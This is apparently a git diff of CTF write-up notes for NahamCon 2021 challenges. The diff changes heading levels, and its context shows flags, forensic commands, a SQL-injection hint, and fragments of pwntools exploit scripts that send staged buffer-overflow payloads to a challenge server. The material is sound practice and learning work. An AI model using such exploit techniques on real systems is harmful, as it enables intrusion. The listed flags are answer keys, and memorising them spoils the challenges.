@@ -3,10 +3,10 @@
 #### Rules Source code
 ```flag{90bc54705794a62015369fd8e86e557b}```
 
-### Nahamcon2021
+#### Nahamcon2021
 ```flag{e36bc5a67dd2fe5f33b62123f78fbcef}```
 
-### Veebee
+#### Veebee
 https://www.aldeid.com/wiki/Decode-VBE-script
 
 ![image](https://user-images.githubusercontent.com/1076452/111078386-de735b80-84d3-11eb-912b-a0be3716c787.png)
@@ -17,7 +17,7 @@ Double decode, changing name to vbe after first decode.
 
 ```flag{f805593d933f5433f2a04f082f400d8c}```
 
-### Echo
+#### Echo
 
 ![image](https://user-images.githubusercontent.com/1076452/111018313-e7124780-8396-11eb-8fa1-b99817861f79.png)
 
@@ -27,7 +27,7 @@ Double decode, changing name to vbe after first decode.
 
 ```flag{1beadaf44586ea4aba2ea9a00c5b6d91}```
 
-### Homeward Bound
+#### Homeward Bound
 
 ![image](https://user-images.githubusercontent.com/1076452/111000058-25d8db00-8360-11eb-9b99-3a045d6fd1f2.png)
 
@@ -35,13 +35,13 @@ Double decode, changing name to vbe after first decode.
 
 ```flag{26080a2216e95746ec3e932002b9baa4}```
 
-### Shoelaces
+#### Shoelaces
 
 strings shoelaces.jpg | grep flag
 
 ```flag{137288e960a3ae9b148e8a7db16a69b0}```
 
-### Pollex
+#### Pollex
 
 binwalk --dd='.*' pollex
 
@@ -49,19 +49,19 @@ binwalk --dd='.*' pollex
 
 ```flag{65c34a1ec121a286600ddd48fe36bc00}```
 
-### Car Keys
+#### Car Keys
 
 ![image](https://user-images.githubusercontent.com/1076452/111019745-e7631080-839f-11eb-9708-59de62d02bc9.png)
 
 ```flag{6f980c0101c8aa361977cac06508a3de}```
 
-### Eighth Circle
+#### Eighth Circle
 
 http://www.malbolge.doleczek.pl/
 
 ![image](https://user-images.githubusercontent.com/1076452/111020021-baaff880-83a1-11eb-8efd-e168fd0f6bdd.png)
 
-### Henpeck
+#### Henpeck
 
 ```tshark -r ./henpeck.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > keyboards.txt```
 
@@ -72,7 +72,7 @@ python usbkeyboard.py keyboards.txt
 so the answer is flag{f7733e0093b7d281dd0a30fcf34a9634} hahahah lol
 ```
 
-### Ret2basic
+#### Ret2basic
 
 ```
 #!/usr/bin/python
@@ -105,17 +105,17 @@ r.interactive()
 
 ![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)
 
-### The List
+#### The List
 
 ```flag{0eb219803dbfcda8620dae0772ae2d72}```
 
-### esab64
+#### esab64
 
 cat esab64 | rev | base64 -d | rev
 
 ```flag{fb5211b498afe87b1bd0db601117e16e}```
 
-### Resourceful
+#### Resourceful
 
 ![image](https://user-images.githubusercontent.com/1076452/111007125-e1077100-836c-11eb-9a10-edb11904272d.png)
 
@@ -125,13 +125,13 @@ cat esab64 | rev | base64 -d | rev
 
 ```flag{7eecc051f5cb3a40cd6bda40de6eeb32}```
 
-### Chicken wings 
+#### Chicken wings 
 
 https://lingojam.com/WingDing
 
 ```flag{e0791ce68f718188c0378b1c0a3bdc9e}```
 
-### Andra
+#### Andra
 
 ![image](https://user-images.githubusercontent.com/1076452/111007452-a9e58f80-836d-11eb-8fcb-2b86f03bf057.png)
 
@@ -141,13 +141,13 @@ https://lingojam.com/WingDing
 
 ```flag{d9f72316dbe7ceab0db10bed1a738482}```
 
-### Merch Store
+#### Merch Store
 
 Source code merch store
 
 ```flag{fafc10617631126361c693a2a3fce5a7} ```
 
-### Bad Blog
+#### Bad Blog
 
 SQLi En user agent
 ![image](https://user-images.githubusercontent.com/1076452/111036069-1c9d4c00-83fc-11eb-8b89-be0cd7109da4.png)
@@ -164,7 +164,7 @@ SQLi En user agent
 
 ```flag{8b31eecb1831ed594fa27ef5b431fe34}```
 
-### Dice Roll
+#### Dice Roll
 
 ```
 #!/usr/bin/env python
@@ -203,7 +203,7 @@ guess(num)
 
 ```flag{e915b62b2195d76bfddaac0160ed3194}```
 
-### Microscopium
+#### Microscopium
 
 React APP
 
@@ -248,7 +248,7 @@ Pin: 4784
 flag{06754e57e02b0c505149cd1055ba5e0b}
 ```
 
-### Typewriter
+#### Typewriter
 
 https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf
 
@@ -272,7 +272,7 @@ https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet
 
 ```flag{c442f9ee67c7ab471bb5643a9346cf5e}```
 
-### some-really-ordinary-program
+#### some-really-ordinary-program
 
 ```
 #!/usr/bin/env python3
@@ -282,8 +282,6 @@ import subprocess
 
 context(terminal=['tmux', 'new-window'])
 context(os="linux", arch="amd64")
-
-
 
 p_name = "./some-really-ordinary-program"  ## change for the challenge name
 DEBUG = 0
@@ -302,7 +300,6 @@ else:
     p = remote("challenge.nahamcon.com", 32119)
 ## everything goes here
 
-
 ####    ADDRESSES  ####
 
 call_read = p64(0x401000)
@@ -315,10 +312,7 @@ call_read_p3 = p64(0x401006)
 
 bss = 0x0000000000402000 
 ####               ####
-
-
 ####    FUNCTIONS  ####
-
 ####               ####
 
 input("Send first payload ? ")
@@ -347,10 +341,7 @@ p.sendline(payload)
 
 input("Send second payload ? ")
 
-
-
 p.sendline(b'F' * (0xf-1) )
-
 
 input("Send third payload ? ")
 payload = b''
@@ -376,7 +367,7 @@ p.interactive()
 ```
 ```flag{175c051dbd3db6857f3e6d2907952c87}```
 
-### Weather APP
+#### Weather APP
 
 ```
 #!/usr/bin/python3
@@ -428,7 +419,7 @@ print(res.text)
 ```
 ```HTB{w3lc0m3_t0_th3_p1p3_dr34m}```
 
-### Eaxy
+#### Eaxy
 
 ```
 #!/usr/bin/env python3
